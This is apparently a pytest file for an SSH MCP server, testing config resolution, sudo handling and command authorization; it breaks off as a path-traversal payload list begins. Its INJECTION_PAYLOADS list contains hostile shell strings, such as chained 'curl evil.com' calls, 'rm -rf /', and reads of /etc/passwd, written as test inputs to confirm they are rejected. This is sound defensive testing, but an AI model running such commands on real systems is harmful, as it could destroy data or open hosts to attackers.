"""Tests for server.py integration with the real production code.

These tests import and exercise the actual modules that server.py uses
(``server.main()`` argparse wiring, ``SudoHandler``, ``AuthorizationManager``,
``SSHClientManager``, ``FileTransferService``, ``RequestContextMiddleware``)
instead of reimplementing logic inline.  Only true I/O boundaries are mocked:
``paramiko.SSHClient``, ``server.create_app`` and ``asyncio.run``.
"""

import asyncio
import json
import os
import sys
import threading
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from fastmcp import FastMCP

import server
from lib.auth import AuthorizationManager
from lib.config import build_default_config
from lib.constants import (
    DEFAULT_CHECK_COMMAND,
    DEFAULT_CONFIG_DIR,
    DEFAULT_LOG_DIR,
    DEFAULT_SSH_KEY_FILENAME,
    DEFAULT_SSH_PORT,
    DEFAULT_SSH_TIMEOUT_SECONDS,
    MCP_SSH_CONFIG_PATH,
    MCP_SSH_LOG_DIR,
    MCP_SSH_SSH_KEY,
    SUDO_NO_PASSWORD_FLAG,
    SUDO_PASSWORD_PROMPT_FLAGS,
)
from lib.exceptions import (
    FileTransferError,
    PathValidationError,
    SSHAuthenticationError,
    SSHConnectionError,
    SSHTimeoutError,
)
from lib.file_transfer import FileTransferService
from lib.request_context import RequestContextMiddleware
from lib.ssh_client import SSHClientManager
from lib.sudo import SudoHandler


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write_config(config_dir: Path, data: dict) -> Path:
    """Write a config dict to ssh-mcp-config.json in the given directory."""
    config_dir.mkdir(parents=True, exist_ok=True)
    config_path = config_dir / "ssh-mcp-config.json"
    config_path.write_text(json.dumps(data))
    return config_path


def _make_minimal_config(**overrides) -> dict:
    """Return a minimal valid config dict, with optional overrides."""
    base = {
        "version": 1,
        "ssh_targets": {
            "testserver": {
                "host": "10.0.0.1",
                "username": "testuser",
                "port": 22,
                "password": "testpass",
            },
        },
        "block_patterns": [r"\brm\s+-rf\b", r"\bshutdown\b"],
        "allowed_commands": {
            "default": [
                {"targets": ["*"], "commands": ["hostname", "uptime", "df"]},
            ],
            "api_keys": [],
            "networks": [],
        },
        "settings": {
            "max_output_length": 50000,
            "command_timeout_max": 120,
        },
    }
    base.update(overrides)
    return base


def _make_config_manager(tmp_path: Path, config: dict):
    """Create a ConfigManager pointing to tmp_path with the given config.

    Returns the manager WITHOUT starting the watcher thread.
    """
    from lib.config import ConfigManager

    _write_config(tmp_path, config)
    mgr = ConfigManager(str(tmp_path))
    # load() already called in __init__; reload to ensure exact config
    mgr.reload()
    return mgr


def _password_target(**overrides) -> dict:
    """SSH target dict using password authentication."""
    target = {
        "host": "10.0.0.1",
        "username": "root",
        "auth": {"type": "password", "password": "secret"},
    }
    target.update(overrides)
    return target


def _key_target(**overrides) -> dict:
    """SSH target dict using key authentication."""
    target = {
        "host": "10.0.0.1",
        "username": "root",
        "auth": {"type": "key", "key_filename": "~/keys/id_ed25519"},
    }
    target.update(overrides)
    return target


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def config_manager(tmp_path):
    """A ConfigManager wired to a minimal, known config."""
    return _make_config_manager(tmp_path, _make_minimal_config())


@pytest.fixture
def auth_manager(config_manager):
    """An AuthorizationManager over the shared minimal config."""
    return AuthorizationManager(config_manager)


# ---------------------------------------------------------------------------
# main() config/log-dir resolution tests (real argparse wiring)
# ---------------------------------------------------------------------------


class TestResolveConfigDir:
    """Tests that server.main() resolves --config / CONFIG_DIR correctly."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() with create_app/asyncio mocked.

        Returns the kwargs server.main() passes to create_app().
        """
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(server, "_run_server", lambda *a, **k: None)
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_default(self, monkeypatch):
        """Uses DEFAULT_CONFIG_DIR when no env var or CLI arg is given."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["config_dir"] == DEFAULT_CONFIG_DIR

    def test_env_var(self, monkeypatch):
        """Respects the CONFIG_DIR env var as the default."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={"CONFIG_DIR": "/custom/config/path"}
        )
        assert captured["config_dir"] == "/custom/config/path"

    def test_cli_arg(self, monkeypatch):
        """Respects the --config CLI arg."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(
            monkeypatch, ["server.py", "--config", "/cli/config/path"]
        )
        assert captured["config_dir"] == "/cli/config/path"

    def test_cli_arg_overrides_env(self, monkeypatch):
        """The --config CLI arg takes precedence over CONFIG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py", "--config", "/cli/path"],
            env={"CONFIG_DIR": "/env/path"},
        )
        assert captured["config_dir"] == "/cli/path"

    def test_new_env_var_overrides_legacy(self, monkeypatch):
        """MCP_SSH_CONFIG_PATH takes precedence over CONFIG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py"],
            env={"CONFIG_DIR": "/legacy/path", MCP_SSH_CONFIG_PATH: "/new/path"},
        )
        assert captured["config_dir"] == "/new/path"


class TestFixPermissionsFlag:
    """Tests that server.main() plumbs the --fix-permissions flag to create_app()."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() and return the create_app() kwargs."""
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(server, "_run_server", lambda *a, **k: None)
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_flag_present_sets_true(self, monkeypatch):
        """Passing --fix-permissions propagates fix_permissions=True."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py", "--fix-permissions"])
        assert captured["fix_permissions"] is True

    def test_flag_absent_defaults_false(self, monkeypatch):
        """Omitting --fix-permissions leaves fix_permissions=False."""
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["fix_permissions"] is False


class TestResolveLogDir:
    """Tests that server.main() resolves --log-dir / LOG_DIR correctly."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() with create_app/asyncio mocked."""
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(server, "_run_server", lambda *a, **k: None)
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_default(self, monkeypatch):
        """Uses DEFAULT_LOG_DIR when no env var or CLI arg is given."""
        monkeypatch.delenv("LOG_DIR", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["log_dir"] == DEFAULT_LOG_DIR

    def test_env_var(self, monkeypatch):
        """Respects the LOG_DIR env var as the default."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={"LOG_DIR": "/custom/log/path"}
        )
        assert captured["log_dir"] == "/custom/log/path"

    def test_cli_arg(self, monkeypatch):
        """Respects the --log-dir CLI arg."""
        monkeypatch.delenv("LOG_DIR", raising=False)
        captured = self._run_main(
            monkeypatch, ["server.py", "--log-dir", "/cli/log/path"]
        )
        assert captured["log_dir"] == "/cli/log/path"

    def test_cli_arg_overrides_env(self, monkeypatch):
        """The --log-dir CLI arg takes precedence over LOG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py", "--log-dir", "/cli/path"],
            env={"LOG_DIR": "/env/path"},
        )
        assert captured["log_dir"] == "/cli/path"

    def test_new_env_var_overrides_legacy(self, monkeypatch):
        """MCP_SSH_LOG_DIR takes precedence over LOG_DIR."""
        captured = self._run_main(
            monkeypatch,
            ["server.py"],
            env={"LOG_DIR": "/legacy/path", MCP_SSH_LOG_DIR: "/new/path"},
        )
        assert captured["log_dir"] == "/new/path"


class TestPrintDefaultConfig:
    """Tests that server.main() --print-default-config prints and exits early."""

    def test_flag_prints_config_and_skips_create_app(self, monkeypatch, capsys):
        """With the flag, main() prints build_default_config() and never calls
        create_app."""
        called = []

        def fake_create_app(**kwargs):
            called.append(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(sys, "argv", ["server.py", "--print-default-config"])
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        server.main()

        captured = capsys.readouterr()
        printed = json.loads(captured.out)
        assert printed == build_default_config()
        assert called == []

    def test_without_flag_calls_create_app(self, monkeypatch):
        """Without the flag, main() proceeds to create_app() as normal."""
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(server, "_run_server", lambda *a, **k: None)
        monkeypatch.setattr(sys, "argv", ["server.py"])
        monkeypatch.delenv("CONFIG_DIR", raising=False)
        server.main()

        assert captured.get("config_dir") is not None


class TestResolveSshKey:
    """Tests that server.main() resolves --ssh-key / MCP_SSH_SSH_KEY correctly."""

    @staticmethod
    def _run_main(monkeypatch, argv, env=None):
        """Run the real server.main() with create_app/asyncio mocked."""
        captured = {}

        def fake_create_app(**kwargs):
            captured.update(kwargs)
            return MagicMock()

        monkeypatch.setattr(server, "create_app", fake_create_app)
        monkeypatch.setattr(server, "asyncio", MagicMock())
        monkeypatch.setattr(server, "_run_server", lambda *a, **k: None)
        monkeypatch.setattr(sys, "argv", argv)
        for key, value in (env or {}).items():
            monkeypatch.setenv(key, value)
        server.main()
        return captured

    def test_default(self, monkeypatch):
        """Uses DEFAULT_SSH_KEY_FILENAME when no env var or CLI arg is given."""
        monkeypatch.delenv(MCP_SSH_SSH_KEY, raising=False)
        monkeypatch.delenv("SSH_KEY_PATH", raising=False)
        captured = self._run_main(monkeypatch, ["server.py"])
        assert captured["ssh_key_path"] == DEFAULT_SSH_KEY_FILENAME

    def test_new_env_var(self, monkeypatch):
        """Respects the MCP_SSH_SSH_KEY env var as the default."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={MCP_SSH_SSH_KEY: "/new/key/path"}
        )
        assert captured["ssh_key_path"] == "/new/key/path"

    def test_legacy_env_var_fallback(self, monkeypatch):
        """Falls back to the legacy SSH_KEY_PATH env var."""
        captured = self._run_main(
            monkeypatch, ["server.py"], env={"SSH_KEY_PATH": "/legacy/key/path"}
        )
        assert captured["ssh_key_path"] == "/legacy/key/path"

    def test_new_env_var_overrides_legacy(self, monkeypatch):
        """MCP_SSH_SSH_KEY takes precedence over SSH_KEY_PATH."""
        captured = self._run_main(
            monkeypatch,
            ["server.py"],
            env={"SSH_KEY_PATH": "/legacy/path", MCP_SSH_SSH_KEY: "/new/path"},
        )
        assert captured["ssh_key_path"] == "/new/path"

    def test_cli_arg(self, monkeypatch):
        """Respects the --ssh-key CLI arg."""
        monkeypatch.delenv(MCP_SSH_SSH_KEY, raising=False)
        monkeypatch.delenv("SSH_KEY_PATH", raising=False)
        captured = self._run_main(
            monkeypatch, ["server.py", "--ssh-key", "/cli/key/path"]
        )
        assert captured["ssh_key_path"] == "/cli/key/path"

    def test_cli_arg_overrides_env(self, monkeypatch):
        """The --ssh-key CLI arg takes precedence over MCP_SSH_SSH_KEY."""
        captured = self._run_main(
            monkeypatch,
            ["server.py", "--ssh-key", "/cli/path"],
            env={MCP_SSH_SSH_KEY: "/env/path"},
        )
        assert captured["ssh_key_path"] == "/cli/path"


# ---------------------------------------------------------------------------
# Client-IP extraction tests (real RequestContextMiddleware)
# ---------------------------------------------------------------------------


class TestExtractClientIP:
    """Tests for RequestContextMiddleware._extract_ip()."""

    @staticmethod
    def _make_request(headers=None, client_host=None):
        request = MagicMock()
        request.headers.get = lambda name, default="": (headers or {}).get(name, default)
        if client_host is None:
            request.client = None
        else:
            request.client = MagicMock()
            request.client.host = client_host
        return request

    def test_uses_leftmost_forwarded_for(self):
        """X-Forwarded-For leftmost entry is the original client."""
        request = self._make_request(
            headers={"X-Forwarded-For": "203.0.113.9, 10.0.0.1"},
            client_host="10.0.0.1",
        )
        assert (
            RequestContextMiddleware._extract_ip(
                request, trusted_proxies=["10.0.0.1"]
            )
            == "203.0.113.9"
        )

    def test_falls_back_to_client_host(self):
        """Without X-Forwarded-For, the direct client host is used."""
        request = self._make_request(headers={}, client_host="192.168.1.5")
        assert RequestContextMiddleware._extract_ip(request) == "192.168.1.5"

    def test_invalid_forwarded_for_falls_back_to_loopback(self):
        """Invalid X-Forwarded-For values from a trusted peer fall back to 127.0.0.1."""
        request = self._make_request(
            headers={"X-Forwarded-For": "not-an-ip"}, client_host="10.0.0.1"
        )
        assert (
            RequestContextMiddleware._extract_ip(
                request, trusted_proxies=["10.0.0.1"]
            )
            == "127.0.0.1"
        )

    def test_no_client_returns_loopback(self):
        """A request without client info falls back to 127.0.0.1."""
        request = self._make_request(headers={}, client_host=None)
        assert RequestContextMiddleware._extract_ip(request) == "127.0.0.1"


# ---------------------------------------------------------------------------
# Sudo tests (real SudoHandler)
# ---------------------------------------------------------------------------


class TestIsCommandSudo:
    """Tests for SudoHandler.is_sudo_command()."""

    def test_plain_command(self):
        """A command without sudo is not a sudo command."""
        assert SudoHandler.is_sudo_command("hostname") is False

    def test_sudo_prefix(self):
        """'sudo ...' is detected."""
        assert SudoHandler.is_sudo_command("sudo whoami") is True

    def test_sudo_mid_command(self):
        """sudo appearing mid-command is still detected."""
        assert SudoHandler.is_sudo_command("echo hi && sudo whoami") is True

    def test_case_insensitive(self):
        """Detection is case-insensitive."""
        assert SudoHandler.is_sudo_command("SUDO whoami") is True

    def test_word_boundary(self):
        """Words like 'sudoku' must not trigger the match."""
        assert SudoHandler.is_sudo_command("sudoku") is False


class TestSudoValidation:
    """Tests for SudoHandler.validate_sudo()."""

    def test_rejects_sudo_in_command_when_sudo_true(self):
        """sudo=True with 'sudo whoami' returns an error message."""
        error = SudoHandler.validate_sudo("sudo whoami", sudo=True)
        assert error is not None
        assert "ERROR" in error

    def test_allows_normal_command_when_sudo_true(self):
        """sudo=True with 'whoami' passes validation."""
        assert SudoHandler.validate_sudo("whoami", sudo=True) is None

    def test_allows_sudo_in_command_when_sudo_false(self):
        """sudo=False with 'sudo whoami' passes validation (block_patterns handle it)."""
        assert SudoHandler.validate_sudo("sudo whoami", sudo=False) is None

    def test_case_insensitive_sudo_rejection(self):
        """sudo=True with 'SUDO whoami' is rejected (case-insensitive)."""
        assert SudoHandler.validate_sudo("SUDO whoami", sudo=True) is not None


class TestSudoCommandWrapping:
    """Tests for SudoHandler.wrap_sudo_command() (returns a plain string)."""

    def test_wrap_with_password(self):
        """sudo=True with a password uses 'sudo -S -p '''."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, "secret")
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} whoami"

    def test_wrap_without_password(self):
        """sudo=True without a password uses 'sudo -n'."""
        wrapped = SudoHandler.wrap_sudo_command("whoami", True, None)
        assert wrapped == f"{SUDO_NO_PASSWORD_FLAG} whoami"

    def test_no_wrap_when_sudo_false(self):
        """sudo=False leaves the command unchanged."""
        assert SudoHandler.wrap_sudo_command("whoami", False, "secret") == "whoami"

    def test_wrap_complex_command(self):
        """Wrapping works with piped commands."""
        wrapped = SudoHandler.wrap_sudo_command(
            "grep error /var/log/syslog | head -20", True, "secret"
        )
        assert wrapped == f"{SUDO_PASSWORD_PROMPT_FLAGS} grep error /var/log/syslog | head -20"


# ---------------------------------------------------------------------------
# block_patterns tests (real AuthorizationManager)
# ---------------------------------------------------------------------------


class TestCheckBlockPatterns:
    """Tests for block-pattern enforcement via AuthorizationManager."""

    def test_blocks_matching(self, tmp_path):
        """Commands matching a configured block pattern are denied."""
        config = _make_minimal_config(block_patterns=[r"\bshutdown\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        result = auth.check_command("sudo shutdown now", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked" in (result.matched_via or "")
        assert auth.check_command("hostname", "testserver", "127.0.0.1").allowed is True

    def test_allows_non_matching(self, auth_manager):
        """Commands that match no pattern and are allow-listed pass."""
        assert auth_manager.check_command("hostname", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("df -h", "testserver", "127.0.0.1").allowed is True

    def test_case_insensitive_match(self, tmp_path):
        """Block patterns match case-insensitively."""
        config = _make_minimal_config(block_patterns=[r"\brm\s+-rf\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("RM -RF /", "testserver", "127.0.0.1")
        assert result.allowed is False

    def test_blocks_sudo(self, tmp_path):
        """Blocking 'sudo' forces callers to use the sudo=True parameter."""
        config = _make_minimal_config(block_patterns=[r"\bsudo\b"])
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command(
            "sudo systemctl restart nginx", "testserver", "127.0.0.1"
        ).allowed is False
        # 'systemctl' is not blocked by the sudo pattern — it is only
        # denied because it is not in the allow list.
        denied = auth.check_command("systemctl restart nginx", "testserver", "127.0.0.1")
        assert denied.allowed is False
        assert "blocked" not in (denied.matched_via or "")
        # Case-insensitive
        assert auth.check_command(
            "SUDO systemctl restart nginx", "testserver", "127.0.0.1"
        ).allowed is False

    def test_blocks_sudo_command(self, tmp_path):
        """'sudo whoami' is blocked when \\bsudo\\b is a block pattern."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b"],
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["whoami"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))
        result = auth.check_command("sudo whoami", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked" in (result.matched_via or "")

    def test_sudo_in_default_block_patterns(self, tmp_path):
        """The configured block_patterns list is passed through as-is."""
        config = _make_minimal_config(
            block_patterns=[r"\bsudo\b", r"\brm\s+-rf\b", r"\bshutdown\b"]
        )
        mgr = _make_config_manager(tmp_path, config)
        assert mgr.data.get("block_patterns", [])[0] == r"\bsudo\b"


# ---------------------------------------------------------------------------
# is_command_allowed tests (real AuthorizationManager)
# ---------------------------------------------------------------------------


class TestIsCommandAllowed:
    """Tests for command allow-listing via AuthorizationManager."""

    def test_allows_in_rules(self, auth_manager):
        """Commands matching the default rules are allowed."""
        assert auth_manager.check_command("hostname", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("uptime", "testserver", "127.0.0.1").allowed is True
        assert auth_manager.check_command("df -h", "testserver", "127.0.0.1").allowed is True

    def test_denies_not_in_rules(self, auth_manager):
        """Commands not in any rule are denied."""
        assert auth_manager.check_command("rm", "testserver", "127.0.0.1").allowed is False
        assert auth_manager.check_command("curl", "testserver", "127.0.0.1").allowed is False

    def test_respects_target_filter(self, tmp_path):
        """Only commands for servers matching the targets filter are allowed."""
        config = _make_minimal_config(
            ssh_targets={
                "server-a": {"host": "10.0.0.1", "username": "u", "password": "p"},
                "server-b": {"host": "10.0.0.2", "username": "u", "password": "p"},
            },
            allowed_commands={
                "default": [
                    {"targets": ["server-a"], "commands": ["hostname"]},
                    {"targets": ["server-b"], "commands": ["uptime"]},
                ],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command("hostname", "server-a", "127.0.0.1").allowed is True
        assert auth.check_command("uptime", "server-a", "127.0.0.1").allowed is False
        assert auth.check_command("uptime", "server-b", "127.0.0.1").allowed is True
        assert auth.check_command("hostname", "server-b", "127.0.0.1").allowed is False

    def test_wildcard_commands(self, tmp_path):
        """Wildcard '*' in commands allows anything, but block_patterns still apply."""
        config = _make_minimal_config(
            allowed_commands={
                "default": [{"targets": ["*"], "commands": ["*"]}],
                "api_keys": [],
                "networks": [],
            },
        )
        auth = AuthorizationManager(_make_config_manager(tmp_path, config))

        assert auth.check_command("anything", "testserver", "127.0.0.1").allowed is True
        # Block patterns still deny dangerous commands even with a wildcard.
        assert auth.check_command("rm -rf /", "testserver", "127.0.0.1").allowed is False
        assert auth.check_command("shutdown -h now", "testserver", "127.0.0.1").allowed is False


# ---------------------------------------------------------------------------
# get_ssh_target tests
# ---------------------------------------------------------------------------


class TestGetSshClient:
    """Tests for get_ssh_target target lookup logic."""

    def test_unknown_server_raises(self, tmp_path):
        """Raises ValueError for unknown server, listing available servers."""
        config = _make_minimal_config(
            ssh_targets={
                "myserver": {
                    "host": "10.0.0.1",
                    "username": "user",
                    "password": "pass",
                },
            },
        )
        mgr = _make_config_manager(tmp_path, config)

        target = mgr.get_ssh_target("nonexistent")
        assert target is None
        available = mgr.list_ssh_targets()
        assert "myserver" in available
        assert "nonexistent" not in available

    def test_known_server_returns_dict(self, tmp_path):
        """get_ssh_target returns a dict for a known server."""
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)

        target = mgr.get_ssh_target("testserver")
        assert target is not None
        assert target["host"] == "10.0.0.1"
        assert target["username"] == "testuser"
        assert target["port"] == 22


# ---------------------------------------------------------------------------
# ssh_list_servers tests
# ---------------------------------------------------------------------------


class TestSshListServers:
    """Tests for ssh_list_servers data retrieval."""

    def test_returns_targets(self, tmp_path):
        """Returns target IDs and their non-secret details from config."""
        config = _make_minimal_config(
            ssh_targets={
                "web": {"host": "10.0.0.1", "username": "admin", "password": "pw1"},
                "db": {"host": "10.0.0.2", "username": "root", "port": 2222, "password": "pw2"},
            },
        )
        mgr = _make_config_manager(tmp_path, config)

        targets = mgr.list_ssh_targets()
        result = {}
        for tid in targets:
            t = mgr.get_ssh_target(tid)
            result[tid] = {
                "host": t["host"],
                "port": t.get("port", 22),
                "username": t["username"],
            }

        assert "web" in result
        assert "db" in result
        assert result["web"]["host"] == "10.0.0.1"
        assert result["web"]["username"] == "admin"
        assert result["web"]["port"] == 22
        assert result["db"]["port"] == 2222
        # Secrets must not be leaked
        assert "password" not in result["web"]
        assert "private_key" not in result["web"]

    def test_returns_empty_for_no_targets(self, tmp_path):
        """Returns empty dict when config has no ssh_targets."""
        # ConfigManager requires non-empty ssh_targets, so the empty case
        # is exercised through the data pattern.
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)
        result = {tid: True for tid in mgr.list_ssh_targets() if tid not in mgr.data["ssh_targets"]}
        assert result == {}


# ---------------------------------------------------------------------------
# settings integration tests
# ---------------------------------------------------------------------------


class TestSettings:
    """Tests for settings access pattern."""

    def test_max_output_length_from_config(self, tmp_path):
        """max_output_length is read from config settings."""
        config = _make_minimal_config(
            settings={"max_output_length": 99999, "command_timeout_max": 60},
        )
        mgr = _make_config_manager(tmp_path, config)

        max_output = mgr.data.get("settings", {}).get("max_output_length", 50000)
        assert max_output == 99999

    def test_max_output_length_default(self, tmp_path):
        """Default max_output_length is 50000 when not in config."""
        config = _make_minimal_config()
        mgr = _make_config_manager(tmp_path, config)

        max_output = mgr.data.get("settings", {}).get("max_output_length", 50000)
        assert max_output == 50000

    def test_command_timeout_max(self, tmp_path):
        """command_timeout_max is read from config settings."""
        config = _make_minimal_config(
            settings={"max_output_length": 50000, "command_timeout_max": 30},
        )
        mgr = _make_config_manager(tmp_path, config)

        timeout_max = mgr.data.get("settings", {}).get("command_timeout_max", 120)
        assert timeout_max == 30


# ---------------------------------------------------------------------------
# get_ssh_target password tests
# ---------------------------------------------------------------------------


class TestGetSshClientPassword:
    """Tests for get_ssh_target password extraction."""

    def test_returns_password(self, tmp_path):
        """When target has a password, get_ssh_target returns it."""
        config = _make_minimal_config(
            ssh_targets={
                "test-target": {
                    "host": "127.0.0.1",
                    "port": 22,
                    "username": "testuser",
                    "password": "secret123",
                }
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        target = mgr.get_ssh_target("test-target")
        assert target["password"] == "secret123"

    def test_returns_without_password(self, tmp_path):
        """When target has no password, none is present."""
        config = _make_minimal_config(
            ssh_targets={
                "test-target": {
                    "host": "127.0.0.1",
                    "port": 22,
                    "username": "testuser",
                    "private_key": "/path/to/key",
                }
            }
        )
        mgr = _make_config_manager(tmp_path, config)
        target = mgr.get_ssh_target("test-target")
        assert target.get("password") is None
        assert target["private_key"] == "/path/to/key"


# ---------------------------------------------------------------------------
# SSH client creation tests (mock paramiko, real SSHClientManager)
# ---------------------------------------------------------------------------


class TestSSHClientCreation:
    """Tests for SSHClientManager.get_client().

    paramiko.SSHClient / AutoAddPolicy are mocked, but the manager's real
    target parsing, defaults, and auth dispatch are exercised.
    """

    def test_password_auth_connects(self):
        """Password auth passes password into connect() and returns the client."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager()
            client = manager.get_client(_password_target())

        assert client is mock_cls.return_value
        mock_cls.return_value.set_missing_host_key_policy.assert_called_once()
        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=DEFAULT_SSH_TIMEOUT_SECONDS,
            password="secret",
        )

    def test_password_auth_custom_timeout(self):
        """The manager's timeout is forwarded to connect()."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager(default_timeout=45)
            manager.get_client(_password_target())

        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=45,
            password="secret",
        )

    def test_key_auth_expands_home_and_passes_pkey(self):
        """Key auth expands '~' and passes the loaded pkey to connect()."""
        fake_pkey = MagicMock()
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ), patch.object(
            SSHClientManager, "_load_ssh_key", return_value=fake_pkey
        ) as mock_load:
            manager = SSHClientManager()
            manager.get_client(_key_target())

        mock_load.assert_called_once_with(os.path.expanduser("~/keys/id_ed25519"))
        mock_cls.return_value.connect.assert_called_once_with(
            hostname="10.0.0.1",
            port=DEFAULT_SSH_PORT,
            username="root",
            timeout=DEFAULT_SSH_TIMEOUT_SECONDS,
            pkey=fake_pkey,
        )

    def test_default_port_used_when_missing(self):
        """Missing target port falls back to DEFAULT_SSH_PORT."""
        with patch("lib.ssh_client.SSHClient") as mock_cls, patch(
            "lib.ssh_client.AutoAddPolicy"
        ):
            manager = SSHClientManager()
            manager.get_client(_password_target())

        _, kwargs = mock_cls.return_value.connect.call_args
        assert kwargs["port"] == DEFAULT_SSH_PORT

    def test_unsupported_auth_type_raises_value_error(self):
        """An unsupported auth type raises ValueError."""
        with patch("lib.ssh_client.SSHClient"), patch("lib.ssh_client.AutoAddPolicy"):
            manager = SSHClientManager()
            with pytest.raises(ValueError, match="Unsupported auth type"):
                manager.get_client(
                    {
                        "host": "10.0.0.1",
                        "username": "root",
                        "auth": {"type": "agent"},
                    }
                )


# ---------------------------------------------------------------------------
# Command-injection tests (real AuthorizationManager, parametrized)
# ---------------------------------------------------------------------------

INJECTION_PAYLOADS = [
    # --- $() command substitution ---
    "$(whoami)",
    "echo $(whoami)",
    "ls$(whoami)",
    "hostname$(id)",
    # --- backtick substitution ---
    "`whoami`",
    "echo `whoami`",
    "ls`whoami`",
    # --- newline / carriage-return injection ---
    "ls\nrm -rf /",
    "hostname\nid",
    "ls\rwhoami",
    "hostname\r\nid",
    # --- chaining operators ---
    "hostname && curl evil.com",
    "hostname || curl evil.com",
    "hostname; curl evil.com",
    "hostname | curl evil.com",
    "hostname & curl evil.com",
    "hostname&&curl evil.com",
    "hostname||curl evil.com",
    # --- block-pattern commands ---
    "rm -rf /",
    "shutdown -h now",
    "sudo shutdown now",
    # --- nested / mixed payloads ---
    "$(hostname); $(id)",
    "echo `id` > /tmp/pwned",
    "hostname && $(rm -rf /)",
    "cat /etc/passwd | head -1; shutdown",
]


class TestCommandInjection:
    """Parametrized command-injection tests via the real AuthorizationManager."""

    @pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
    def test_injection_rejected(self, payload, auth_manager):
        """Injection payloads must be denied, never executed."""
        result = auth_manager.check_command(payload, "testserver", "127.0.0.1")
        assert result.allowed is False, (
            f"Expected '{payload}' to be rejected, got: {result.reason}"
        )

    def test_block_pattern_metadata(self, auth_manager):
        """Blocked commands expose the matching pattern via matched_via."""
        result = auth_manager.check_command("rm -rf /", "testserver", "127.0.0.1")
        assert result.allowed is False
        assert "blocked:" in (result.matched_via or "")

    def test_safe_chained_commands_allowed(self, auth_manager):
        """Chained commands whose segments are all allowed pass."""
        result = auth_manager.check_command("hostname && uptime", "testserver", "127.0.0.1")
        assert result.allowed is True

    def test_unicode_fullwidth_pipe_allowed(self, auth_manager):
        """Fullwidth pipe (U+FF5C) is not a shell metachar — safe behavior."""
        result = auth_manager.check_command("hostname \uff5c uptime", "testserver", "127.0.0.1")
        assert result.allowed is True

    def test_unicode_fullwidth_dollar_allowed(self, auth_manager):
        """Fullwidth dollar (U+FF04) is not shell command substitution."""
        result = auth_manager.check_command("hostname \uff04(whoami)", "testserver", "127.0.0.1")
        assert result.allowed is True


# ---------------------------------------------------------------------------
# Path-traversal tests (real FileTransferService, parametrized)
# ---------------------------------------------------------------------------

TRAVERSAL_PAYLOADS = [
